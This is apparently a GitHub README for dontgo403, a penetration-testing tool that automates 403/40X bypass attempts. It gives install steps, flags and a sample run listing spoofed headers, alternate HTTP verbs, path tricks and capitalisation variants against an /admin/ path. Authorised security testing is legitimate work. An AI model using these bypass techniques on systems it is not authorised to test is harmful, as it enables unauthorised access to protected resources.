<p align="center">
<img src="https://i.imgur.com/0vLHCHd.png" width="600" height="100" >
</p>

[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/dwyl/esta/issues)

dontgo403 is a tool to bypass 40X errors.

### Installation
```bash
git clone https://github.com/devploit/dontgo403; cd dontgo403; go get; go build
```

### Customization
If you want to edit or add new bypasses, you can add it directly to the specific file in [payloads](https://github.com/devploit/dontgo403/tree/main/payloads) folder and the tool will use it.


### Options
```bash
./dontgo403 -h

Command line application that automates different attempts to bypass 40X codes

Usage:
  dontgo403 [flags]

Flags:
  -h, --help               help for dontgo403
  -p, --proxy string       Proxy URL. For example: http://127.0.0.1:8080
  -u, --uri string         Target URL
  -a, --useragent string   Set the User-Agent string (default 'dontgo403/0.2')
```


### Example of usage
```sh
./dontgo403 -p http://127.0.0.1:8080 -u https://server.com/admin/

[*] USING PROXY: http://127.0.0.1:8080

[+] HTTP METHODS
PATCH: 404
POST: 403
MOVE: 404
OPTIONS: 404
GET: 403
HEAD: 404
TRACE: 405
PUT: 404
COPY: 404
LABEL: 404
DELETE: 404
CONNECT: 404

[+] VERB TAMPERING
Forwarded-For-Ip 127.0.0.1: 403
True-Client-IP 127.0.0.1: 403
X-HTTP-Method-Override PUT: 403
X-Host 127.0.0.1: 403
X-Forwarded-For localhost: 403
X-Rewrite-URL /admin: 403
X-Forwarded 127.0.0.1: 403
X-Forwarded-For-Original localhost: 403
X-Forwarded-Server localhost: 403
Forwarded-For 127.0.0.1: 403
X-Forwarded-For 127.0.0.1: 200 <-------------------- 200, OK
X-Forwarded-Host localhost: 403
X-Remote-Addr localhost: 403
X-Override-URL /admin: 403
X-Remote-Addr 127.0.0.1: 403
X-HTTP-Host-Override 127.0.0.1: 403
X-Originating-IP 127.0.0.1: 403
Forwarded 127.0.0.1: 403
X-Forwarded localhost: 403
X-Original-URL /admin: 403
X-Custom-IP-Authorization 127.0.0.1: 403
X-Remote-IP 127.0.0.1: 403
X-Forwarded-Server 127.0.0.1: 403
X-Forward 127.0.0.1: 403
Client-IP 127.0.0.1: 403
X-Real-IP 127.0.0.1: 403
X-Host localhost: 403
X-Forward localhost: 403
X-Forwarded-By 127.0.0.1: 403
Referer /admin: 403
X-Forwarded-For-Original 127.0.0.1: 403
X-Forward-For 127.0.0.1: 403
X-Forwarded-Host 127.0.0.1: 403
X-Client-IP 127.0.0.1: 403
Forwarded-For localhost: 403
Forwarded localhost: 403
X-Forwarded-By localhost: 403

[+] CUSTOM PATHS
End path ??: 403
End path /: 404
End path /.: 404
End path ..\;/: 404
End path //: 404
End path ?: 403
Mid path ./: 404
Mid path %2e/: 404
Mid path .\;/: 404
Mid path ;foo=bar/: 404

[+] CAPITALIZATION
https://server.com/Admin/: 403
https://server.com/aDmin/: 403
https://server.com/adMin/: 403
https://server.com/admIn/: 403
https://server.com/admiN/: 403
```

### Contact
[Twitter](https://www.twitter.com/devploit), [Telegram](https://t.me/devploit)